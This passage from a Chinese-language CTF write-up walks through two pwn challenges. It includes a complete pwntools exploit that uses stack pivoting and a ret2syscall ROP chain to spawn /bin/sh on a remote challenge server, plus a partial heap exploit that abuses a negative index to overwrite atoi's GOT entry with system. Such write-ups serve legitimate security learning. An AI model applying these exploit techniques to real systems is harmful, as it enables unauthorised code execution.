highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// edx</span>
-  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// ecx</span>
-  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// r8d</span>
-  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r9d</span>
-  <span class="kt">char</span> <span class="n">v8</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF</span>
-  <span class="kt">char</span> <span class="n">v9</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-40h] BYREF // &lt;-----目标字符串</span>
-  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-18h]</span>
-  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+3Ch] [rbp-14h]</span>
-  <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-10h]</span>
-  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+44h] [rbp-Ch]</span>
-  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-8h]</span>
-  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+4Ch] [rbp-4h] // &lt;------得分和</span>
-                                          <span class="c1">// 也就是最后输入的字符串的长度</span>
-<span class="p">}</span>
-</code></pre></div></div> <h5 id="细心的童鞋肯定发现只有v15是无符号数其他都是有符号数恰巧又有对v15做减法的操作答错题目所以如果故意答错题目既倒着开v15就会向下溢出为一个很大正整数此时构造ropchain打一个-ret2syscall-完全足够了">   细心的童鞋肯定发现，只有v15是无符号数，其他都是有符号数，恰巧又有对v15做减法的操作（答错题目），所以如果故意答错题目（既倒着开），v15就会向下溢出为一个很大正整数，此时构造ROPchain，打一个 <strong><em>ret2syscall</em></strong> 完全足够了。<br/></h5> <h5 id="然后说另一种解法也就是哥们独创的解法还把aic给带偏了如果不考虑整型向下溢出的话那么正好溢出到返回地址于是可以按照栈迁移的思路来打">   然后说另一种解法，也就是哥们独创的解法，还把aic给带偏了🤣。<br/>   如果不考虑整型向下溢出的话，那么正好溢出到返回地址,于是可以按照栈迁移的思路来打。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000401B76 loc_401B76:                             <span class="p">;</span> CODE XREF: main+227↑j
-.text:0000000000401B76                 mov     edx, 19h
-.text:0000000000401B7B                 lea     rax, aNowShowMeYourP <span class="p">;</span> <span class="s2">"Now, show me your power!</span><span class="se">\n</span><span class="s2">"</span>
-.text:0000000000401B82                 mov     rsi, rax
-.text:0000000000401B85                 mov     edi, 1
-.text:0000000000401B8A                 call    write
-.text:0000000000401B8F                 mov     edx, 14h
-.text:0000000000401B94                 lea     rax, aSayTheMagicWor <span class="p">;</span> <span class="s2">"Say the magic word!</span><span class="se">\n</span><span class="s2">"</span>
-.text:0000000000401B9B                 mov     rsi, rax
-.text:0000000000401B9E                 mov     edi, 1
-.text:0000000000401BA3                 call    write
-.text:0000000000401BA8                 mov     edx, <span class="o">[</span>rbp+var_4]
-.text:0000000000401BAB                 lea     rax, <span class="o">[</span>rbp+var_40]
-.text:0000000000401BAF                 mov     esi, edx
-.text:0000000000401BB1                 mov     rdi, rax
-.text:0000000000401BB4                 call    myRead
-.text:0000000000401BB9                 mov     eax, 0
-.text:0000000000401BBE                 leave
-.text:0000000000401BBF                 retn
-.text:0000000000401BBF <span class="p">;</span> <span class="o">}</span> // starts at 40192E
-.text:0000000000401BBF main            endp
-</code></pre></div></div> <h5 id="此处为-main-最后的输入字符串的部分注意到0x401ba8开始为myread可视为一般的read准备参数其中var_4var_40都是固定值-4和-40所以可以将rbp迁移到某个-4位置为一个较大数的位置这样可以实现读大量字符串于是去找一块符合条件的风水宝地">   此处为 <code class="language-plaintext highlighter-rouge">main()</code> 最后的输入字符串的部分，注意到<code class="language-plaintext highlighter-rouge">0x401BA8</code>开始为<code class="language-plaintext highlighter-rouge">myread()</code>（可视为一般的<code class="language-plaintext highlighter-rouge">read()</code>）准备参数，其中<code class="language-plaintext highlighter-rouge">var_4</code>，<code class="language-plaintext highlighter-rouge">var_40</code>都是固定值（-4和-40），所以可以将<code class="language-plaintext highlighter-rouge">rbp</code>迁移到某个<code class="language-plaintext highlighter-rouge">-4</code>位置为一个较大数的位置，这样可以实现读大量字符串。<br/>   于是去找一块符合条件的风水宝地</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.data:00000000004A0277                 db    0
-.data:00000000004A0278                 db 0FFh
-.data:00000000004A0279                 db 0FFh
-.data:00000000004A027A                 db 0FFh
-.data:00000000004A027B                 db 0FFh
-.data:00000000004A027C                 db 0FFh
-.data:00000000004A027D                 db 0FFh
-.data:00000000004A027E                 db 0FFh
-.data:00000000004A027F                 db 0FFh
-</code></pre></div></div> <h5 id="随便找一个即可">   随便找一个即可<br/></h5> <h5 id="然后是返回地址理论上可以选0x4019ce及以下的任意位置但是上如果直接跳转到上面myread的位置会segv猜测是栈没布置好访问到非法内存了而跳转到0x4019ce就没有问题当然这意味着要再来50组游戏虽然这次可以随便玩">   然后是返回地址，理论上可以选<code class="language-plaintext highlighter-rouge">0x4019CE</code>及以下的任意位置，但是上如果直接跳转到上面<code class="language-plaintext highlighter-rouge">myread()</code>的位置会SEGV，猜测是栈没布置好，访问到非法内存了，而跳转到<code class="language-plaintext highlighter-rouge">0x4019CE</code>就没有问题，当然这意味着要再来50组游戏，虽然这次可以随便玩。<br/></h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004019C7                 mov     <span class="o">[</span>rbp+var_4], 30
-.text:00000000004019CE                 mov     <span class="o">[</span>rbp+var_10], 50
-.text:00000000004019D5                 lea     rax, asc_474107 <span class="p">;</span> <span class="s2">"-------------------------"</span>
-.text:00000000004019DC                 mov     rdi, rax
-.text:00000000004019DF                 call    puts
-.text:00000000004019E4                 mov     <span class="o">[</span>rbp+var_8], 0
-.text:00000000004019EB                 jmp     loc_401B6A
-</code></pre></div></div> <h5 id="由我们控制的myread结束后程序将leave-ret这也是这种恰好只溢出返回地址的题目在栈迁移时关键的一点既不将返回地址覆盖为leave-ret而是想办法要再次利用-read-往fake_rbp-上写一些东西然后用函数末尾自带的leave-ret完成向目标位置的栈迁移对于这题而言leave-ret的流程是将rsp骗到我们输入地址0x40的位置pop-rbp该位置然后ret上一个字长位置这意味着需要在输入时设置0x40--0x8的没啥用数据然后才是ropchain">   由我们控制的<code class="language-plaintext highlighter-rouge">myread()</code>结束后，程序将<code class="language-plaintext highlighter-rouge">leave ret</code>，这也是这种恰好只溢出返回地址的题目在栈迁移时关键的一点，既不将返回地址覆盖为<code class="language-plaintext highlighter-rouge">leave ret</code>，而是想办法要再次利用 <code class="language-plaintext highlighter-rouge">read()</code> ，往<code class="language-plaintext highlighter-rouge">fake_rbp</code> 上写一些东西，然后用函数末尾自带的<code class="language-plaintext highlighter-rouge">leave ret</code>，完成向目标位置的栈迁移。<br/>   对于这题而言，<code class="language-plaintext highlighter-rouge">leave ret</code>的流程是将<code class="language-plaintext highlighter-rouge">rsp</code>骗到我们输入地址<code class="language-plaintext highlighter-rouge">+0x40</code>的位置，<code class="language-plaintext highlighter-rouge">pop rbp</code>该位置，然后<code class="language-plaintext highlighter-rouge">ret</code>上一个字长位置。这意味着需要在输入时设置<code class="language-plaintext highlighter-rouge">0x40 + 0x8</code>的没啥用数据，然后才是ROPchain。<br/></h5> <h5 id="由于不是标解所以把这种exp放上来仅供参考">   由于不是标解，所以把这种exp放上来，仅供参考</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
-<span class="c1"># io = process("./pwn6")
-</span><span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn6</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">152.136.11.155</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31514</span><span class="p">)</span>
-<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x401291</span>
-<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x474010</span>
-<span class="n">rax_ret</span> <span class="o">=</span> <span class="mh">0x41dd07</span>
-<span class="n">rdi_ret</span> <span class="o">=</span> <span class="mh">0x402368</span>
-<span class="n">rsi_ret</span> <span class="o">=</span> <span class="mh">0x409560</span>
-<span class="n">rdx_rcx_ret</span> <span class="o">=</span> <span class="mh">0x401855</span>
-<span class="n">main</span> <span class="o">=</span> <span class="mh">0x4019ce</span>
-<span class="n">myread</span> <span class="o">=</span> <span class="mh">0x401B7b</span>
-<span class="n">data_2</span> <span class="o">=</span> <span class="mh">0x4A0698</span> <span class="o">+</span> <span class="mi">4</span> <span class="c1"># 0x4a069c
-</span><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x401016</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
-    <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">-------------------------</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">target</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">?</span><span class="sh">'</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Clomp</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
-        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">word!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 80 0x50
-</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">data_2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="c1"># change rbp
-</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
-    <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">-------------------------</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">target</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">?</span><span class="sh">'</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Clomp</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
-        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">oxdeadbeef</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx_rcx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
-
-<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">word!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 80 0x50
-</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
-</code></pre></div></div> <h3 id="-凝眸回首映芳华">🗒 凝眸回首映芳华</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
-CNSS 娘觉得市面上的笔记软件都不安全，有被泄露的风险，于是自己手搓了一个笔记软件雏形出来~
-
-nc 152.136.11.155 10036
-
-💻 题目附件
-点击下载
-
-🚩 Flag格式
-cnss{meaningful_sentence}
-
-🔨 暴打出题人
-@Timlzh
-</code></pre></div></div> <h6 id="以下是出题人的心路历程">   以下是出题人的心路历程。</h6> <p><img src="https://www.helloimg.com/i/2024/09/27/66f65b0bb5560.png" alt="Screenshot 2024-09-27 112702.png"/> <img src="https://www.helloimg.com/i/2024/09/27/66f65b0bcdcc6.png" alt="Screenshot 2024-09-27 112735.png"/> <img src="https://www.helloimg.com/i/2024/09/27/66f65b0bc6c93.png" alt="Screenshot 2024-09-27 112746.png"/></p> <h5 id="看note知堆题增删改看功能齐活">   看note知堆题，增删改看功能齐活.</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/pwn/worktable/cnss2024/pwn8/pwn'</span>
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
-    SHSTK:      Enabled
-    IBT:        Enabled
-</code></pre></div></div> <h5 id="got表可写然后没有pie没有堆题常见的uaf堆溢出offset-by-one等不过即使具体漏洞还没找到也依然可以先-leak-libc--首先strings-libcso6--grep-glibc-可以看到版本为235所以铁有tcache">   GOT表可写、然后没有PIE。没有堆题常见的UAF、堆溢出、offset-by-one等。不过即使具体漏洞还没找到，也依然可以先 <code class="language-plaintext highlighter-rouge">leak libc</code> 。 <br/>   首先<code class="language-plaintext highlighter-rouge">strings ./libc.so.6 | grep "glibc"</code> 可以看到版本为2.35，所以铁有tcache</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 0 ~ 8
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-    <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  <span class="c1"># free 0~7
-</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">)</span> <span class="c1"># 0 ~ 8
-</span>
-<span class="nf">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 8
-</span><span class="nf">show</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
-</code></pre></div></div> <h5 id="show8时就把-libc-泄露了">   <code class="language-plaintext highlighter-rouge">show(8)</code>时就把 libc 泄露了<br/></h5> <h5 id="现在再来找具体的漏洞先关注一下堆信息的存储方式也就是1-create-a-new-page-of-notes">   现在再来找具体的漏洞<br/>   先关注一下堆信息的存储方式，也就是<code class="language-plaintext highlighter-rouge">1. Create a new page of notes</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
-          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
-          <span class="n">v4</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
-          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter length: "</span><span class="p">);</span>
-          <span class="n">v8</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
-          <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
-          <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span><span class="p">);</span>
-          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter content: "</span><span class="p">);</span>
-          <span class="n">readstr</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">v8</span><span class="p">);</span>
-          <span class="k">break</span><span class="p">;</span>
-</code></pre></div></div> <h5 id="v8和mallocintv8那两行就表明了堆信息的存储方式对于这种东西我的意见是能看就看不能看直接动调如下">   <code class="language-plaintext highlighter-rouge">v8</code>和<code class="language-plaintext highlighter-rouge">malloc((int)v8)</code>那两行就表明了堆信息的存储方式。对于这种东西，我的意见是，能看就看，不能看直接动调，如下。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 申请一个0x10大小的堆，index = 0</span>
-pwndbg&gt; x/10gx 0x4040C0
-0x4040c0:       0x0000000000000010      0x00000000004052a0
-0x4040d0:       0x0000000000000000      0x0000000000000000
-0x4040e0:       0x0000000000000000      0x0000000000000000
-0x4040f0:       0x0000000000000000      0x0000000000000000
-0x404100:       0x0000000000000000      0x0000000000000000
-</code></pre></div></div> <h5 id="从动调直接看出首先输入一个index确认从heap0x4040c0开始的偏移每16字节作为一个结构体前8个存堆大小后8个是堆的指针">   从动调直接看出，首先输入一个<code class="language-plaintext highlighter-rouge">index</code>，确认从heap(0x4040c0)开始的偏移，每16字节作为一个结构体，前8个存堆大小，后8个是堆的指针。</h5> <h5 id="接下来是2-view-notes就是打印">   接下来是<code class="language-plaintext highlighter-rouge">2. View notes</code>，就是打印</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
-          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
-          <span class="n">v5</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
-          <span class="n">puts</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
-          <span class="k">break</span><span class="p">;</span>
-</code></pre></div></div> <h5 id="用的puts所以才能把libc--offset带出来如果严格按堆大小输出上面leak-libc就没戏了">   用的<code class="language-plaintext highlighter-rouge">puts</code>，所以才能把<code class="language-plaintext highlighter-rouge">libc + offset</code>带出来，如果严格按堆大小输出，上面leak libc就没戏了。</h5> <h5 id="看看3-delete-notes">   看看<code class="language-plaintext highlighter-rouge">3. Delete notes</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
-          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
-          <span class="n">v6</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
-          <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
-          <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
-          <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v6</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-          <span class="k">break</span><span class="p">;</span>
-</code></pre></div></div> <h5 id="没有uaf下一个">   没有UAF，下一个</h5> <h5>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span>
-        <span class="k">break</span><span class="p">;</span>
-      <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
-      <span class="n">v7</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
-      <span class="n">printf</span><span class="p">(</span><span class="s">"Enter content: "</span><span class="p">);</span>
-      <span class="n">readstr</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v7</span><span class="p">));</span>
-</code></pre></div></div> <h5 id="也没啥好说的那整这么多没用的那么漏洞在哪里呢对于这道题的漏洞可能需要堆题方面的一些经验一般的堆题抛开堆信息的存储可能不同之外都有一些固定的规律第一堆的索引是系统分配程序查询可用索引进行分配第二堆的索引有一定限制不能过大也就是堆的申请数量有限制第三在分配或者释放堆块时首先对存放堆信息的位置检查确认目标位置避免造成指针重复覆盖或者free释放无效空间所以再看这道题这些特征完全没有这也是为什么整体的逻辑实现较短当我们回头再看case-1时发现v4和v8是有符号整型尤其v4由于堆信息的寻址不是数组访问v4在寻址时不会被转化为整型所以当v4为一个负数时反而会反向去寻址加上对该位置的赋值实际上这是一个任意写的漏洞不过只能每两个字长中写一个字长即使这样也已经足够了由于got表可写并且已经leak-libc所以考虑使用负索引向上修改got表要修改的got表需要满足两个条件首先got表项位于0x40xxx0到0x40xxx8这个位置被用于存放v8的值其次由于v8是int只有低4位可以覆盖需要更高的位置已经被填写所以我们需要一个已经重定位过的got表项考察上述两点于是选择atoi的got表改完之后在再发送binshx00即可">   也没啥好说的。<br/>   那整这么多没用的那么漏洞在哪里呢？对于这道题的漏洞，可能需要堆题方面的一些经验。<br/>   一般的堆题，抛开堆信息的存储可能不同之外，都有一些固定的规律。第一，堆的索引是系统分配，程序查询可用索引进行分配；第二，堆的索引有一定限制，不能过大，也就是堆的申请数量有限制；第三，在分配或者释放堆块时，首先对存放堆信息的位置检查，确认目标位置，避免造成指针重复覆盖或者<code class="language-plaintext highlighter-rouge">free()</code>释放无效空间。<br/>   所以再看这道题，这些特征完全没有，这也是为什么整体的逻辑实现较短。当我们回头再看<code class="language-plaintext highlighter-rouge">case 1</code>时，发现<code class="language-plaintext highlighter-rouge">v4</code>和<code class="language-plaintext highlighter-rouge">v8</code>是有符号整型，尤其<code class="language-plaintext highlighter-rouge">v4</code>，由于堆信息的寻址不是数组访问，<code class="language-plaintext highlighter-rouge">v4</code>在寻址时不会被转化为整型，所以当<code class="language-plaintext highlighter-rouge">v4</code>为一个负数时，反而会反向去寻址，加上对该位置的赋值，实际上这是一个任意写的漏洞，不过只能每两个字长中写一个字长，即使这样也已经足够了。<br/>   由于GOT表可写，并且已经leak libc，所以考虑使用负索引向上修改GOT表。要修改的GOT表需要满足两个条件。首先，GOT表项位于<code class="language-plaintext highlighter-rouge">0x40xxx0</code>到<code class="language-plaintext highlighter-rouge">0x40xxx8</code>，这个位置被用于存放<code class="language-plaintext highlighter-rouge">v8</code>的值；其次，由于<code class="language-plaintext highlighter-rouge">v8</code>是<code class="language-plaintext highlighter-rouge">int</code>，只有低4位可以覆盖，需要更高的位置已经被填写，所以我们需要一个已经重定位过的GOT表项。考察上述两点，于是选择<code class="language-plaintext highlighter-rouge">atoi()</code>的GOT表。<br/>   改完之后，在再发送<code class="language-plaintext highlighter-rouge">'/bin/sh\x00'</code>即可。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v8_4</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
-<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">low 4 bytes</span><span class="sh">"</span><span class="p">,</span> <span class="n">v8_4</span><span class="p">)</span>
-<span class="nf">add</span><span class="p">({</span><span class="n">简单计算偏移得到的负索引</span><span class="p">},</span> <span class="n">v8_4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 更改后4bytes
